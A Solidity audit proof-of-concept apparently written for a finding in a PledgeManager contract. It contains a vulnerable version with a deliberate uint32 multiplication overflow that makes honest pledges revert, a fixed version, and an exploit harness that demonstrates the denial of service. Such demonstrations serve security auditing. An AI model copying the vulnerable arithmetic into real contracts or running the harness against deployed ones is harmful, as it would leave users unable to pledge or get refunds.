// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/// @notice Minimal faithful double of an ERC20 stablecoin (6 decimals).
contract MiniToken {
    string public name;
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(string memory _name) {
        name = _name;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice Faithful minimal double of Remora's PledgeManager holding the
///         VERBATIM vulnerable arithmetic from the finding. pricePerToken and
///         numTokens are BOTH uint32, so the product is evaluated in uint32 and
///         reverts under 0.8 checked arithmetic once it exceeds type(uint32).max
///         (~$4294 at 6 decimals) BEFORE it is ever widened to uint256.
contract PledgeManager {
    MiniToken public immutable stablecoin;
    mapping(address => uint256) public pledgedOf;

    constructor(MiniToken _stablecoin) {
        stablecoin = _stablecoin;
    }

    /// @notice A user pledges `numTokens` at `pricePerToken` (6-decimal USD).
    function pledge(address pledger, uint32 pricePerToken, uint32 numTokens) external returns (uint256) {
        uint256 stablecoinAmount = pricePerToken * numTokens; // @> uint32*uint32 reverts when product > type(uint32).max
        stablecoin.transferFrom(pledger, address(this), stablecoinAmount);
        pledgedOf[pledger] += stablecoinAmount;
        return stablecoinAmount;
    }

    /// @notice Same latent bug on the refund path.
    function refundTokens(address pledger, uint32 pricePerToken, uint32 numTokens) external returns (uint256) {
        uint256 refundAmount = numTokens * pricePerToken; //TOOD: overflow check
        pledgedOf[pledger] -= refundAmount;
        stablecoin.transfer(pledger, refundAmount);
        return refundAmount;
    }
}

/// @notice Fixed variant: widen one operand to uint256 before multiplying so
///         the product can never overflow the uint32 domain.
contract PledgeManagerFixed {
    MiniToken public immutable stablecoin;
    mapping(address => uint256) public pledgedOf;

    constructor(MiniToken _stablecoin) {
        stablecoin = _stablecoin;
    }

    function pledge(address pledger, uint32 pricePerToken, uint32 numTokens) external returns (uint256) {
        uint256 stablecoinAmount = uint256(pricePerToken) * numTokens; // fixed
        stablecoin.transferFrom(pledger, address(this), stablecoinAmount);
        pledgedOf[pledger] += stablecoinAmount;
        return stablecoinAmount;
    }
}

/// @notice Self-contained exploit harness demonstrating the DoS: a reasonable
///         pledge (pricePerToken = $1 = 1e6, numTokens = 5000 -> intended
///         5e9 stablecoin units) reverts inside the uint32 multiply. The
///         intended-but-denied amount is minted to a MARKER token at SINK.
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // Reasonable, honest pledge inputs (NOT adversarial): $1 price, 5000 tokens.
    uint32 internal constant PRICE_PER_TOKEN = 1_000_000; // $1.00 at 6 decimals
    uint32 internal constant NUM_TOKENS = 5000;

    bool public pledgeReverted;
    uint256 public intendedStablecoinAmount; // what the pledge SHOULD have cost
    uint256 public markerMinted;

    function run() external payable {
        // --- Create every helper contract up front, in fixed order ---
        MiniToken stablecoin = new MiniToken("USDC");
        PledgeManager manager = new PledgeManager(stablecoin);
        MiniToken marker = new MiniToken("DOS-MARKER");

        // --- Preconditions: fund the honest user and approve is implicit ---
        address user = ATTACKER; // the harmed party in this DoS
        // Intended cost under correct (widened) arithmetic:
        intendedStablecoinAmount = uint256(PRICE_PER_TOKEN) * uint256(NUM_TOKENS); // 5e9
        stablecoin.mint(user, intendedStablecoinAmount);

        // --- Execute: the honest pledge reverts inside uint32*uint32 ---
        try manager.pledge(user, PRICE_PER_TOKEN, NUM_TOKENS) returns (uint256) {
            pledgeReverted = false;
        } catch {
            pledgeReverted = true;
            // Record the harm magnitude (denied pledge value) on the MARKER at SINK.
            markerMinted = intendedStablecoinAmount;
            marker.mint(SINK, markerMinted);
        }
    }
}
